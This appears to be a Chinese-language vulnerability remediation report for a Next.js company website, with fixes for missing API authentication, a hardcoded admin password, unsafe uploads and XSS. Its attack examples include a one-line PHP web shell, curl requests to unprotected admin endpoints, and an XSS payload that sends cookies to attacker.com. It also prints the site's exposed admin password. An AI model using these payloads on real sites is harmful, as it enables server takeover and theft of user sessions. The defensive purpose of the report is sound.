# 🛡️ 网站安全漏洞修复报告

## 🚨 发现的严重安全漏洞

### 1. ❌ **完全没有 API 认证保护**（最严重！）

**漏洞描述**：
- 所有 `/api/admin/*` 路由完全没有认证
- 任何人都可以直接访问 API 上传文件、修改数据库
- 认证只在客户端进行（localStorage），可以轻易绕过

**攻击示例**：
```bash
# 攻击者可以直接上传恶意文件
curl -X POST https://your-site.com/api/admin/upload \
  -F "file=@malware.php.jpg"

# 攻击者可以直接修改数据库
curl -X POST https://your-site.com/api/admin/carousels \
  -H "Content-Type: application/json" \
  -d '{"title":"<script>alert(1)</script>","image":"/xss.jpg"}'
```

**危害**：
- ⚠️ 可以上传病毒、木马、挖矿脚本
- ⚠️ 可以注入恶意脚本窃取用户信息
- ⚠️ 可以篡改网站内容
- ⚠️ 可以删除所有数据

---

### 2. ❌ **密码硬编码在前端代码**

**漏洞位置**：`app/admin/page.tsx` 第19行

```typescript
if (username === 'admin' && password === 'Dsa@2025#Admin!') {
  // 密码明文暴露在客户端源代码中
}
```

**危害**：
- 任何人查看网页源代码就能看到管理员密码
- 密码永久暴露在 GitHub 代码库中
- 无法更改密码（硬编码）

---

### 3. ❌ **文件上传漏洞**

**漏洞位置**：`app/api/admin/upload/route.ts`

**问题**：
1. 只检查 MIME type（`file.type`），攻击者可以伪造
2. 没有检查文件真实内容（文件头/魔术数字）
3. 可以上传双扩展名文件（`virus.php.jpg`）
4. 直接使用用户提供的文件扩展名

**攻击示例**：
```javascript
// 攻击者可以创建伪装的 PHP 木马
const maliciousFile = new File(
  ['<?php system($_GET["cmd"]); ?>'], 
  "shell.php.jpg", 
  { type: "image/jpeg" } // 伪装成图片
);
```

**危害**：
- 上传 PHP/JSP 木马，完全控制服务器
- 上传挖矿脚本，消耗服务器资源
- 上传蠕虫病毒，感染其他文件

---

### 4. ❌ **XSS 跨站脚本攻击**

**漏洞位置**：所有 POST/PUT API 路由

**问题**：没有任何输入清理和验证

**攻击示例**：
```bash
curl -X POST https://your-site.com/api/admin/carousels \
  -H "Content-Type: application/json" \
  -d '{
    "title": "<script>fetch(\"http://attacker.com?cookie=\"+document.cookie)</script>",
    "subtitle": "<iframe src=\"http://mining.com/miner.js\"></iframe>"
  }'
```

**危害**：
- 窃取用户 Cookie 和 Session
- 注入挖矿脚本
- 重定向用户到钓鱼网站
- 篡改页面内容

---

### 5. ❌ **SQL注入风险**

**漏洞位置**：所有使用 `params.id` 的 API 路由

**问题**：
```typescript
// 没有验证 params.id 是否为有效数字
const id = parseInt(params.id) // parseInt("'; DROP TABLE users--") = NaN
await prisma.product.findUnique({ where: { id } })
```

虽然 Prisma 提供一定保护，但 `parseInt(NaN)` 会导致错误。

---

## ✅ 修复方案

### 已创建的安全库：

#### 1. **认证库** (`lib/auth.ts`)

✅ **功能**：
- 安全的密码哈希（HMAC-SHA256）
- 会话 token 生成和验证
- Token 自动过期（24小时）
- 时序安全的密码比较（防止时序攻击）
- API 认证中间件

✅ **使用方法**：
```typescript
import { requireAuth, authenticateAdmin } from '@/lib/auth'

// 在 API 路由中：
export async function POST(request: NextRequest) {
  // 验证认证
  const auth = requireAuth(request)
  if (!auth.authenticated) {
    return NextResponse.json({ error: auth.error }, { status: 401 })
  }
  
  // 继续处理...
}

// 登录接口：
const { success, token, error } = authenticateAdmin(username, password)
if (success) {
  return NextResponse.json({ token })
}
```

#### 2. **文件验证库** (`lib/file-validator.ts`)

✅ **功能**：
- 检查文件真实内容（魔术数字验证）
- 防止双扩展名攻击
- 黑名单：阻止危险扩展名（.php, .jsp, .exe等）
- 白名单：只允许特定图片格式
- 生成安全的随机文件名
- 文件大小验证

✅ **使用方法**：
```typescript
import { validateUploadedFile } from '@/lib/file-validator'

const { valid, error, safeFileName } = await validateUploadedFile(file, 5)
if (!valid) {
  return NextResponse.json({ error }, { status: 400 })
}
```

#### 3. **输入清理库** (`lib/input-sanitizer.ts`)

✅ **功能**：
- XSS 防护：移除危险的 HTML 标签和脚本
- URL 验证：阻止 `javascript:`、`data:` 协议
- 输入长度限制
- HTML 实体编码
- 数据类型验证

✅ **使用方法**：
```typescript
import { sanitizeProductInput, sanitizeHTML } from '@/lib/input-sanitizer'

const { valid, data, errors } = sanitizeProductInput(body)
if (!valid) {
  return NextResponse.json({ errors }, { status: 400 })
}

// 使用清理后的数据
await prisma.product.create({ data })
```

---

## 🔧 紧急修复步骤

### 步骤 1：创建认证 API 路由

```typescript
// app/api/admin/auth/route.ts
import { NextRequest, NextResponse } from 'next/server'
import { authenticateAdmin } from '@/lib/auth'

export async function POST(request: NextRequest) {
  const body = await request.json()
  const { username, password } = body
  
  const { success, token, error } = authenticateAdmin(username, password)
  
  if (!success) {
    return NextResponse.json({ error }, { status: 401 })
  }
  
  return NextResponse.json({ token })
}
```

### 步骤 2：添加环境变量

创建 `.env.local` 文件：
```bash
# 管理员账号（请修改为强密码）
ADMIN_USERNAME=admin
# 密码哈希（通过 hashPassword 函数生成）
ADMIN_PASSWORD_HASH=your_hashed_password_here

# 会话密钥（随机生成，保密！）
SESSION_SECRET=your_random_32_byte_secret_here_change_this
```

### 步骤 3：更新前端登录

```typescript
// app/admin/page.tsx 修改：
const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault()
  setLoading(true)
  
  try {
    const res = await fetch('/api/admin/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    })
    
    if (res.ok) {
      const { token } = await res.json()
      localStorage.setItem('admin_token', token)
      router.push('/admin/products')
    } else {
      setError('用户名或密码错误')
    }
  } catch (error) {
    setError('登录失败')
  }
  
  setLoading(false)
}
```

### 步骤 4：保护所有 API 路由

在每个 `app/api/admin/*` 路由添加认证：

```typescript
import { requireAuth } from '@/lib/auth'

export async function POST(request: NextRequest) {
  // 添加这3行
  const auth = requireAuth(request)
  if (!auth.authenticated) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }
  
  // 原有代码...
}
```

### 步骤 5：修复文件上传

```typescript
// app/api/admin/upload/route.ts 修改：
import { requireAuth } from '@/lib/auth'
import { validateUploadedFile, generateSafeFileName } from '@/lib/file-validator'

export async function POST(request: NextRequest) {
  // 认证检查
  const auth = requireAuth(request)
  if (!auth.authenticated) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }
  
  const formData = await request.formData()
  const file = formData.get('file') as File
  
  // 完整的文件验证
  const { valid, error, safeFileName } = await validateUploadedFile(file, 5)
  if (!valid) {
    return NextResponse.json({ error }, { status: 400 })
  }
  
  // 使用安全的文件名
  const bytes = await file.arrayBuffer()
  const buffer = Buffer.from(bytes)
  const filepath = join(process.cwd(), 'public', 'images', 'uploads', safeFileName)
  await writeFile(filepath, buffer)
  
  return NextResponse.json({
    success: true,
    url: `/images/uploads/${safeFileName}`
  })
}
```

### 步骤 6：添加输入验证

```typescript
// app/api/admin/products/route.ts 修改：
import { sanitizeProductInput } from '@/lib/input-sanitizer'
import { requireAuth } from '@/lib/auth'

export async function POST(request: NextRequest) {
  // 认证
  const auth = requireAuth(request)
  if (!auth.authenticated) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }
  
  const body = await request.json()
  
  // 输入验证和清理
  const { valid, data, errors } = sanitizeProductInput(body)
  if (!valid) {
    return NextResponse.json({ errors }, { status: 400 })
  }
  
  // 使用清理后的数据
  const product = await prisma.product.create({ data })
  return NextResponse.json(product)
}
```

---

## 🚀 部署注意事项

### 1. 立即修改密码
```bash
# 生成新密码哈希
node -e "const crypto = require('crypto'); const pw = 'YourNewStrongPassword!@#'; console.log(crypto.createHmac('sha256', 'your-secret').update(pw).digest('hex'))"
```

### 2. 设置环境变量
在 Aliyun 服务器上：
```bash
cd /root/dea_company_website
nano .env.local  # 添加上面的环境变量
chmod 600 .env.local  # 保护文件权限
```

### 3. 检查已上传的文件
```bash
# 扫描可疑文件
find public/images/uploads -type f -name "*.php*" -o -name "*.jsp*" -o -name "*.exe*"

# 删除可疑文件
find public/images/uploads -type f \( -name "*.php*" -o -name "*.jsp*" \) -delete
```

### 4. 设置文件权限
```bash
# 上传目录只允许读写，不允许执行
chmod -R 644 public/images/uploads/*
chmod 755 public/images/uploads
```

### 5. Nginx 配置（如果使用）
```nginx
# 阻止执行上传目录中的脚本
location /images/uploads/ {
    location ~ \.(php|jsp|asp|aspx|exe|sh|bat)$ {
        deny all;
    }
}

# 限制文件上传大小
client_max_body_size 5M;
```

---

## 📋 安全检查清单

- [ ] 所有 `/api/admin/*` 路由添加认证
- [ ] 文件上传添加内容验证
- [ ] 所有输入添加清理和验证
- [ ] 密码从前端代码中移除
- [ ] 设置强密码和环境变量
- [ ] 检查并删除可疑上传文件
- [ ] 设置正确的文件权限
- [ ] 更新 `.gitignore` 排除 `.env.local`
- [ ] 定期检查服务器日志
- [ ] 安装防火墙和入侵检测系统

---

## 🔍 持续监控

### 监控脚本

```bash
#!/bin/bash
# monitor-security.sh

echo "=== 安全检查 ==="
echo ""

echo "检查可疑文件..."
find public/images/uploads -type f \( -name "*.php*" -o -name "*.jsp*" -o -name "*.exe*" -o -name "*.sh*" \)

echo ""
echo "检查大文件 (>10MB)..."
find public/images/uploads -type f -size +10M

echo ""
echo "最近上传的文件..."
find public/images/uploads -type f -mtime -1 -ls

echo ""
echo "检查失败的登录尝试..."
journalctl -u pm2* | grep -i "401\|unauthorized\|failed" | tail -20
```

---

## ⚠️ 紧急联系

如果发现网站已被入侵：
1. **立即停止服务**: `pm2 stop all`
2. **备份数据库**: `cp prisma/dev.db prisma/dev.db.backup`
3. **检查进程**: `ps aux | grep -E "node|python|php|perl"`
4. **杀死可疑进程**: `kill -9 <PID>`
5. **扫描恶意文件**: `clamscan -r /root/dea_company_website`
6. **重新部署干净版本**

---

## 📚 参考资料

- [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/)
- [Next.js Security Best Practices](https://nextjs.org/docs/advanced-features/security-headers)
- [File Upload Security](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

